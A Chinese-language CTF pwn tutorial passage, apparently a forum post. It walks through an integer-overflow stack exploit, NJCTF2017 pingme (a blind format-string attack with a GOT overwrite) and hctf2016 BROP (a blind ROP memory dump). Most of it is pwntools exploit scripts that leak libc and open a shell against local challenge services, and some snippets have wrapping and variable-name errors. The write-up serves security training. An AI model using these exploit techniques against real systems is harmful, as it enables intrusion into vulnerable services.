> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-268814.htm)

> [原创] 新人 PWN 入坑总结 (六)

最近有点空，接着更。嘿嘿，还混了个优秀贴，谢谢师傅们。

整数溢出漏洞 0xb
==========

一、shadow-IntergerOverflow-Nice
------------------------------

1. 常规 checksec，开了 NX，FULL RELRO，Canary，没办法 shellcode，修改 got 表。然后 IDA 打开找漏洞：

(1) 整数转换漏洞：

输入 message_length 之后将长度返回进行 atoi，将 atoi 的返回值给到下一个输入 message 的 getline。中间用 atoi 进行了一个字符串转 int 的操作，而 atoi 是一个将数字型字符串转成数字的函数，”-1” 可以转换为 - 1。但是 getline 中 read 的长度参数是 size_t，相当于是 unsigned int，是一个无符号数。

▲而 int 的表达方式是：0~2147483647(0~0x7fffffff)   -2147483648~-1(0x80000000~0xffffffff)

unsigned 的表达方式是：0~4294967295(0~0xffffffff)

那么 int 的 - 1 转换成 unsigned 之后就会变成 0xffffffff，从而溢出。

▲由于程序实现了自定义的 pop，push，ret，call 等几个控制栈帧的汇编代码，所以这里的漏洞不太好找，汇编不太好的只能先慢慢调试验证猜想是否正确。

(2) 栈溢出：栈溢出是从整数转换漏洞中来的，由于 message 是保存在 message 函数栈上的，所以就如果将 read 的长度参数变得很大，就可以栈溢出。

▲这里的栈溢出和平常栈溢出有点不同，而且还开了 canary，照理说这个栈溢出没什么用，但是这里的 Message 是一个循环，只要 message 函数不退出，那么就不会触发 canary 的检查，就算栈溢出了，那也得等到 message 函数退出程序才会崩溃。

2. 现在只有两个漏洞，但是看程序 F5 大法啥也看不出来，看汇编吧：

(1) 输入 name 的 call getline:

![](https://bbs.pediy.com/upload/attach/202108/904686_E2MB83HAWKESNFG.jpg)

(2) 输入长度的 call getline:

![](https://bbs.pediy.com/upload/attach/202108/904686_62HXVNAHH3AE4ZA.jpg)

(3) 输入 message 的 call getline:

![](https://bbs.pediy.com/upload/attach/202108/904686_YFJMAV3FYXDUDVM.jpg)

可以看到，输入 message 和 name 的 getline 中保存数据的参数不一样，

保存 name 的参数是：[ebp+arg_0]

保存 message 的参数是：[ebp+var-2c]

再看一下这两个参数的定义：

arg_0 = dword ptr  8

var_2C = byte ptr -2Ch

可以看到 name 保存在 ebp 的下方，不在 message 的函数栈，但是 message 保存在 ebp 上方，在 message 函数栈中。

3. 那么现在思考下攻击思路。先输入 - 1 执行栈溢出漏洞，将 message 函数栈下方的保存 name 的内容更改为某函数的 got 表，这样在打印 name 时就可以将该函数打印出来。

(这里能打印的原因是 printf 的传参关系，这里能看到，name 和 message 传参所用指令不同：![](https://bbs.pediy.com/upload/attach/202108/904686_Y75S4Y9VHGHF4H8.jpg)

name 是 mov 指令，是直接将 ebp+arg_0 上的内容传给 eax

message 是 lea 指令，是将 ebp+var_2c 这个栈地址传给 edx

那么显而易见，ebp+arg_0 上保存的肯定是一个栈地址，这个栈地址上的内容才是 name 的真实内容。所以如果我们覆盖 ebp+arg_0 上的内容为 got 表，那么再打印就是取 got 表中的内容打印，也是函数真实地址。)

从而泄露出 libc 基地址。之后再执行栈溢出，覆盖返回地址为 ROP 链来 getshell。但是这里有一个问题，由于程序自定了某些汇编函数，并且在调试过程中发现用程序的 call 来调用的函数，返回地址不再是原来 call 函数的下一句代码，而是一个 restore_eip 函数。因为在 leave 和 ret 指令执行前，执行了 call ret，修改了某些东西，导致原本 ebp 下面不再是函数的返回地址了。并且由于是传指针，就算栈溢出，溢出的也只能是 message 函数栈，那有 canary 的情况下，溢出也没有什么意义。但是其它函数返回地址则是直接跳转到 ret_stub 函数，而这个 ret_stub 函数是保存在栈上的。

4. 这里就想到 printf 函数，由于 name 会被打印出来，并且调试可以发现，将 name 总共 16 字节顶满后会连上一个 17F79D79，之后是两个 retn 的地址，再之后就是一个栈地址，这几个数据都没有 \ x00 结束字符，所以可以被 printf 连在一起打印出来：

![](https://bbs.pediy.com/upload/attach/202108/904686_9ERAFDPNYZ88B7Y.jpg)

那么可以考虑将 name 顶满后连上 ebp 泄露出栈地址，之后找到保存 read 返回地址的栈地址，将写入 name 的栈地址更改为保存 read 返回地址的栈地址。之后我们再往 name 中写东西，就相当于覆盖 read 函数的返回地址。再经过反复调试，发现 read 函数返回地址取用的地方刚好是 FFF25c3c-0x100，而且每次都是那个地址，那么就可以覆盖了。(这里利用输入 message 连上 ebp 也可以泄露出 message 的 ebp 上保存的内容，也是相同的栈地址，调试出来的)

5. 现在就尝试编写 exp:

(1) 首先三个函数：

```
#注释头
 
def setName(name):
    io.sendafter('Input name :',name)
 
def setMessage(message):
    io.sendlineafter('Message length :','-1')
    io.sendafter('Input message :',message)
 
def changeName(c):
    io.sendlineafter('Change name?',c)

```

(2) 通过填满 name，泄露一个栈地址：

```
#注释头
 
setName('A'*0x10)
setMessage('BBBBBBBBBB')
sh.recvuntil('<')
sh.recv(0x1C)
stack_addr = u32(sh.recv(4))
changeName('n')
log.info("stack_addr:%x"%stack_addr)

```

(3) 泄露函数真实地址：

```
#注释头
 
payload = 'a'*0x34 + p32(atoi_got) + p32(0x100) + p32(0x100)
#这里第一个p32(0x100)是覆盖getline的读取长度，也就是arg_4，第二个是为了覆盖循环次数，也就是arg_8
setMessage(payload)
sh.recvuntil('<')
atoi_addr = u32(sh.recv(4))
log.info("atoi_addr:%x"%atoi_addr)

```

获取 name 的长度：当然这改掉的是 name 的长度，message 的长度保存在 [ebp+var_30] 上，并且因为 - 1 已经被更改为 0xffffffff，足够大了。

![](https://bbs.pediy.com/upload/attach/202108/904686_TEQ2Y4HGEXQWPZF.jpg)

判断循环次数：

![](https://bbs.pediy.com/upload/attach/202108/904686_652B3VZVC5YCBWY.jpg)

(4) 计算得到 libc 中其它地址：

```
#注释头
 
libc = LibcSearcher('atoi',atoi_addr)
libc_base = atoi_addr - libc.dump('atoi')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')

```

(5) 将写入 name 的地方覆盖成读取 read 函数返回地址的地方：

```
#注释头
 
payload = 'a'*0x34 + p32(target_addr)
setMessage(payload)

```

(6) 再次读取 name 的时候就可以发送 rop 链：

```
#注释头
 
rop = p32(system_addr) + p32(0) + p32(binsh_addr)
setName(rop)

```

(7) 最后 getshell:

▲这个 exp 在不同的 glibc 版本下不太一样，2.23/2.24/2.27 都能跑通，但是在 2.31/2.32 版本下没办法跑通，尤其是 2.31，连栈地址都没办法泄露。2.32 则是在最后一步会失败，不知道为什么。可能是 canary 的原因，不同版本的 canary 检查机制好像不一样。

盲打 0xc
======

一、NJCTF2017_pingme0-- 格式化字符串盲打
------------------------------

1. 搭建题目：socat tcp-listen:10001,fork exec:./pingme,reuseaddr &

2. 题目不给文件，只有地址和端口，可能是 BROP 也可能是格式化字符串盲打。连接上先尝试格式化字符串盲打，输入多个 %p.%p.%p，可以看到泄露出了数据，那么就应该是格式化字符串盲打。

![](https://bbs.pediy.com/upload/attach/202108/904686_HWZBQ69GFEBA4UQ.jpg)

3. 首先利用爆破找到我们输入的参数偏移：

```
#注释头
 
from pwn import*
io = remote("127.0.0.1",10001)
#io = process("./pingme")
 
def exec_fmt(payload):
    io.sendline(payload)
    info = p.recv()
    return info
 
auto = FmtStr(exec_fmt)
offset = auto.offset

```

![](https://bbs.pediy.com/upload/attach/202108/904686_2HU5QUPA7MT29YA.jpg)

偏移为 7，验证一下：

![](https://bbs.pediy.com/upload/attach/202108/904686_3VFNDBWBE6XVDXU.jpg)

4. 利用格式化字符串漏洞将二进制文件 dump 下来：

```
#注释头
 
from pwn import*
 
def dump_memory(start_addr,end_addr):
    result = ""
    while start_addr < end_addr:
        io = remote('127.0.0.1',10001)
        io.recvline()
        payload = "%9$s.AAA" + p32(start_addr)
        io.sendline(payload)
        data = io.recvuntil(".AAA")[:-4]
        if data == "":
            data = "\x00"
        log.info("leaking: 0x%x --> %s"%(start_addr,data.encode('hex')))
        result += data
        start_addr += len(data)
        io.close()
    return result
start_addr = 0x8048000
end_addr = 0x8049000
code_bin = dump_memory(start_addr,end_addr)
with open("code.bin","wb") as f:
    f.write(code_bin)
    f.close()

```

(1) 由于是格式化字符串打印，会打印到字符串结尾 "\x00"，但是不会打印出 "\x00"，所以需要补上 "\x00"。

(2) 这里的 %9$s.AAA 中偏移为 9，是因为打印的是 p32(start_addr) 处的内容，前面有 %9$s.AAA 共八个字节，两个地址单位，所以偏移 7+2=9。并且填充 AAA 也是为了满足地址对齐，同时作为特征点来获取程序传回来的数据。将地址放在后面也是为了防止地址中的 "\x00" 造成截断。

(3)dump 的内容只需要有 0x1000 这么大就行，一个内存页即可。

(4) 没有开启 PIE 时，32 位程序从 0x8048000 开始。

▲搭建题目时，dump 出来的内容可能会有点改变，没办法 gdb 调试，应该是 libc 版本或者 ASLR 的问题，不过不影响，IDA 静态分析就好。

5. 之后就是常规的格式化字符串漏洞利用了，借助 dump 下来的文件，找到 printf 的 got 表地址，利用格式化字符串打印 printf 函数真实地址。之后通过 DynELF 或者 LibcSearch 来获取 system 函数在 libc 中的偏移，利用泄露的 printf 函数真实地址，得到 Libc 加载的基地址，再计算得到 system 函数的真实地址。最后再利用格式化字符串漏洞将 system 函数真实地址写到 printf 的 got 表处，劫持 got 表。最后再输入 binsh 字符串即可劫持 printf("/bin/sh") 为 system("/bin/sh")。

(1) 泄露 printf 函数真实地址:

```
#注释头
 
def get_printf_addr():
    io = remote('127.0.0.1', '10001')
    io.recvline()
    payload = "%9$s.AAA" + p32(printf_got)
    io.sendline(payload)
    data = p.recvuntil(".AAA")[:4]
    log.info("printf address: %s" % data.encode('hex'))
    return data
printf_addr = get_printf_addr()

```

(2) 计算或者 DynELF 得到 system 函数真实地址 system_addr。

(3) 利用格式化字符串漏洞进行 attack

```
payload = fmtstr_payload(7, {printf_got:system_addr})
io = remote('127.0.0.1', '10001')
io.recvline()
io.sendline(payload)
io.recv()
io.sendline('/bin/sh')
io.interactive()

```

参考资料：

[https://www.dazhuanlan.com/2019/10/08/5d9c20226a067/](https://www.dazhuanlan.com/2019/10/08/5d9c20226a067/)

二、hctf2016-brop--ROP 盲打
-----------------------

1. 题目用以下代码编译和搭建，[brop.c] 就是程序代码文件

```
#注释头
 
gcc -z noexecstack -fno-stack-protector -no-pie brop.c -o brop
socat tcp-listen:10001,fork exec:./brop,reuseaddr &

```

2. 程序不打印我们的输入，并且输入多个 %p 没什么反应，那么应该就不是格式化字符串盲打，尝试栈溢出行不行，使用脚本爆破一下：

```
#注释头
 
def getbufferflow_length():
    i = 1
    while 1:
        try:
            sh = remote('127.0.0.1', 10001)
            sh.recvuntil('WelCome my friend,Do you know password?\n ')
            sh.send(i * 'a')
            output = sh.recv()
            sh.close()
            if not output.startswith('No password'):
                return i - 1
            else:
                i += 1
        except EOFError:
            sh.close()
            return i - 1
 
buf_size = getbufferflow_length()
log.info("buf_size:%d"%buf_size)

```

不断尝试，如果没有接收到 “No password” 那就代表程序出错，栈溢出覆盖到了返回地址，这时候就退出，其它错误也退出。最后爆破出来为 72 个字节，那么 buf 的缓冲区就是 72-8(rbp)=64 个字节。(总感觉这里有点问题，如果真是 blind，那么肯定也不知道是 32 位还是 64 位啊，那么就应该两种方案都要尝试一下吧)

3. 寻找可以使得程序挂起的 stop_gadget。这个 stop_gadget 是什么不重要，只要能让程序不崩溃，能够在之后探索其它可以 rop 的时候接收到正确的反馈，那么是什么都可以。

```
#注释头
 
def get_stop_addr(buf_size):
    addr = 0x400000
    while True:
        sleep(0.1)#缓冲
        addr += 1
        payload = "A"*buf_size
        payload += p64(addr)#probe_addr
        try:
            sh = remote('127.0.0.1', 10001)
            sh.recvline()
            sh.sendline(payload)
            sh.recvline()
            sh.close()
            log.info("stop address: 0x%x" % addr)
            return addr
        except EOFError as e:#crash and restart
            sh.close()
            log.info("bad: 0x%x" % addr)
        except:#other error
            log.info("Can't connect")
            addr -= 1

```

4. 得到 stop_addr 之后，就可以继续探索其它的 rop_gadget，这里寻找万能 gadget 的六个 pop 的地方：

```
#注释头
 
def get_gadgets_addr(buf_size, stop_addr):
    addr = stop_addr
    while True:
        sleep(0.1)
        addr += 1
        payload = "A"*buf_size
        payload += p64(addr)
        payload += p64(1) + p64(2) + p64(3) + p64(4) + p64(5) +
        p64(6)
        payload += p64(stop_addr)
        try:
            p = remote('127.0.0.1', 10001)
            p.recvline()
            p.sendline(payload)
            p.recvline()
            p.close()
            log.info("find address: 0x%x" % addr)
            try: # check
                payload = "A"*buf_size
                payload += p64(addr)
                payload += p64(1) + p64(2) + p64(3) + p64(4) + p
                64(5) + p64(6)
                #Six pop without stop_addr
                p = remote('127.0.0.1', 10001)
                p.recvline()
                p.sendline(payload)
                p.recvline()
                p.close()
                log.info("bad address: 0x%x" % addr)
                #Not crash,Bad addr.
            except:#Crash,success addr
                p.close()
                log.info("gadget address: 0x%x" % addr)
                return addr
        except EOFError as e:
            p.close()
            log.info("bad: 0x%x" % addr)
        except:
            log.info("Can't connect")
            addr -= 1

```

找到之后，需要再次检查一下，用来确定是不是万能 gadget，因为如果有程序六个 pop 之后不 retn，那就不是万能 gadget。因为需要 dump 二进制文件，所以需要万能 gadget 中的 Pop rdi;ret 这个 gadget 来 dump 文件。

5. 寻找 puts 函数的 plt 表，方便之后调用 puts 函数和 pop rdi;ret 这个 gadget 来 dump 二进制文件。

```
#注释头
 
def get_puts_addr(buf_size, rdi_ret, stop_gadget):
    addr = 0x400000
    while 1:
        print hex(addr)
        sh = remote('127.0.0.1', 10001)
        sh.recvuntil('password?\n')
        payload = 'A' * buf_size + p64(rdi_ret) + p64(0x400000) + p64(addr) + p64(stop_gadget)
        #call put to print the head of ELF.
        sh.sendline(payload)
        try:
            content = sh.recv()
            if content.startswith('\x7fELF'):
                print("find puts@plt addr: 0x%x"%addr)
                return addr
            sh.close()
            addr += 1
        except EOFError as e:
            sh.close()
            log.info("bad: 0x%x" % addr)
        except:
            log.info("Can't connect")
            addr -= 1

```

这里实际上找出来的地址并不是 puts 函数的 plt 表地址，而是在 puts 的 plt 表前面一点的内容，但是这一小段内容不影响栈和 rdi 寄存器，所以没什么影响。

6. 利用 puts 函数和 pop rdi;ret 来 dump 二进制文件：

```
#注释头
 
def dump_memory(buf_size, stop_addr, gadgets_addr, puts_plt, start_addr, end_addr):
    pop_rdi = gadgets_addr + 9 # pop rdi; ret
    result = ""
    while start_addr < end_addr:
        #print result.encode('hex')
        sleep(0.1)
        payload = "A"*buf_size
        payload += p64(pop_rdi)
        payload += p64(start_addr)
        payload += p64(puts_plt)
        payload += p64(stop_addr)
        try:
            sh = remote('127.0.0.1', 10001)
            sh.recvline()
            sh.sendline(payload)
            data = sh.recv(timeout=0.1) 
            #timeout makes sure to recive all bytes
            if data == "\n":#data = \x00
                data = "\x00"
            elif data[-1] == "\n":
            #data = xxxxx\n\x00,data = \n\x00,data = xxxxx\x00
                data = data[:-1]
            log.info("leaking: 0x%x --> %s" % (start_addr,(data or '').encode('hex')))
            result += data
            start_addr += len(data)
            sh.close()
        except:
            log.info("Can't connect")
    return result

```

由于 puts 函数通过 \x00 进行截断，不会输出 \ x00，并且会在每一次输出末尾加上换行符 \ x0a ，所以有一些特殊情况需要做一些处理，比如单独的 \x00 、 \x0a 等。首先当然是先去掉末尾 puts 自动加上的 \n ，然后如果 recv 到一个 \n ，说明内存中是 \x00 ，如果 recv 到一个 \n\n ，说明内存中是 \ x0a 。 p.recv(timeout=0.1) 是由于函数本身的设定，如果有 \n\n ，它很可能在收到第一个 \n 时就返回了，加上参数可以让它全部接收完。

7. 得到二进制文件后就是常规操作了，利用 Dynelf 或者 LibcSearcher 和 puts 函数找到 system 函数和 binsh 实际位置，之后通过 pop rdi;ret 来为 system 函数赋参数从而 getshell。

```
#注释头
 
sh = remote('127.0.0.1', 10001)
sh.recvuntil('password?\n')
payload = 'a' * length + p64(rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(
stop_gadget)
sh.sendline(payload)
data = sh.recvuntil('\nWelCome', drop=True)
puts_addr = u64(data.ljust(8, '\x00'))
libc = LibcSearcher('puts', puts_addr)
libc_base = puts_addr - libc.dump('puts')
system_addr = libc_base + libc.dump('system')
binsh_addr = libc_base + libc.dump('str_bin_sh')
payload = 'a' * length + p64(rdi_ret) + p64(binsh_addr) + p64(
system_addr) + p64(stop_gadget)
sh.sendline(payload)
sh.interactive()

```

这里的 libcSearcher 有时候不太好用，查到的 libc 不符合，或者是不对。还是 DynElf 好用一些，比较准确，并且由于是 puts 函数打印，所以可能需要单个字符来判断。但实际上 64 位条件下的 got 表中的地址一定是 0x00007fxxxxxxxxxx，所以如果是大端情况，那么 puts 函数一定会截断，接收到的只会是 xxxxxxxxxx7f 和 0a 所以其实只要判断到换行符的时候就可以。

```
#注释头
 
def leak(address):
    data = ""
    c=""
    up = ""
    payload = 'a' * length + p64(rdi_ret) + p64(address) + p64(puts_plt) + p64(stop_gadget)
    sh.recvuntil('password?\n')
    sh.send(payload)
    while True:
        c = p.recv(1)
        if up == '\n' and c == "W":  
            data = data[:-1]                     
            data += "\x00"
            break
        else:
            data += c
        up = c
    data=data[:7]#实际有效地址只有6个字符
    log.info("%#x => %s" % (address, (data or '').encode('hex')))
    return data
 
 
dynelf = DynELF(leak, elf=ELF("./brop"))
system_addr = dynelf.lookup("__libc_system", "libc")

```

但是 DynElf 好像不能找 binsh 字符串，还是感觉 libcsearcher 好用点。

参考资料：

[https://wiki.x10sec.org/pwn/linux/stackoverflow/medium-rop-zh/#brop](https://wiki.x10sec.org/pwn/linux/stackoverflow/medium-rop-zh/#brop)

ctf-all-in-one

[[培训] 优秀毕业生寄语：恭喜 id 咸鱼炒白菜拿到远超 3W 月薪的 offer，《安卓高级研修班》火热招生！！！](https://zhuanlan.kanxue.com/article-16096.htm)

最后于 1 小时前 被 PIG-007 编辑 ，原因：